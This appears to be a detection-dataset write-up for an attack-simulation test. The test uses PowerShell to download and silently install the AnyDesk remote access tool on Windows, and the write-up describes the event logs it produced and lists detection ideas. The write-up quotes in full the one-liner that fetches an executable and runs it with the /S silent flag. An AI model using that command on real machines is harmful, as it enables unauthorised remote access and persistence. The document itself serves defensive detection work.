# T1219-2: Remote Access Tools — AnyDesk Files Detected Test on Windows

## Technique Context

T1219 - Remote Access Tools represents adversary use of legitimate remote access and administration tools for command and control. Tools like AnyDesk, TeamViewer, Chrome Remote Desktop, and RDP are frequently leveraged by threat actors to maintain persistent access to victim environments while blending in with legitimate administrative activity. This technique is particularly valuable to attackers because these tools often bypass network security controls, appear as authorized software, and provide full desktop access. The detection community focuses on identifying unexpected installations, unusual network destinations, and execution of remote access tools from non-standard locations or by suspicious parent processes.

## What This Dataset Contains

This dataset captures a failed attempt to download and install AnyDesk via PowerShell. The core evidence comes from Security event 4688 showing PowerShell execution with the command line: `"powershell.exe" & {Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe" Start-Process $file1 /S;}`.

The PowerShell telemetry reveals the actual script blocks executed, including the web request to download AnyDesk from `https://download.anydesk.com/AnyDesk.exe` and the subsequent attempt to execute it with silent installation flags (`/S`). However, both operations failed - PowerShell events 4100 and 4103 show error messages: `"Could not find a part of the path 'C:\Users\ACME-WS02$\Desktop\AnyDesk.exe'"` for the download, and `"This command cannot be run due to the error: The system cannot find the file specified"` for the execution attempt.

Sysmon provides comprehensive process creation telemetry through events 1, showing the PowerShell process chain and a `whoami.exe` execution (PID 44204) for system reconnaissance. Sysmon also captures extensive DLL loading activity (events 7) showing .NET framework initialization and Windows Defender integration, plus process access events (event 10) showing PowerShell accessing child processes, and named pipe creation (event 17) for PowerShell remoting infrastructure.

## What This Dataset Does Not Contain

The dataset lacks the actual AnyDesk binary since the download failed due to the Desktop directory not existing for the SYSTEM account (`C:\Users\ACME-WS02$\Desktop`). No network connection events are captured showing the attempted HTTPS connection to download.anydesk.com, likely because the connection was never established due to the filesystem error. There are no file modification events showing AnyDesk installation artifacts, registry modifications for persistence, or subsequent remote access activity since the technique failed at the download stage. The Sysmon ProcessCreate configuration filtered out the PowerShell process creation itself, only capturing the child processes (whoami.exe and the second PowerShell instance).

## Assessment

This dataset provides excellent visibility into the attempt phase of remote access tool deployment, even though the technique ultimately failed. The combination of Security 4688 events with full command-line logging and PowerShell 4103/4104 events creates comprehensive coverage of the attack methodology. The failure mode is actually valuable for detection development, as it demonstrates how environmental factors can cause technique failures while still generating detectable artifacts. The presence of both parent and child PowerShell processes with detailed command lines makes this suitable for building detections around PowerShell-based remote access tool installation attempts. However, the lack of successful installation limits its utility for understanding post-compromise indicators or persistence mechanisms.

## Detection Opportunities Present in This Data

1. PowerShell command line containing "download.anydesk.com" URL combined with Invoke-WebRequest cmdlet usage
2. PowerShell script blocks containing remote access tool download URLs from known RAT vendor domains
3. PowerShell attempting to download executables to user Desktop directories with subsequent Start-Process execution
4. Process command lines containing silent installation flags (/S) combined with recently downloaded executables
5. PowerShell error patterns indicating failed RAT installation attempts (filesystem access errors during download)
6. Parent-child process relationships where PowerShell spawns additional PowerShell instances for tool installation
7. Sequence detection combining web request cmdlets, file path construction, and process execution within single script block
8. PowerShell module logging showing Invoke-WebRequest parameter bindings with RAT vendor URLs as OutFile destinations
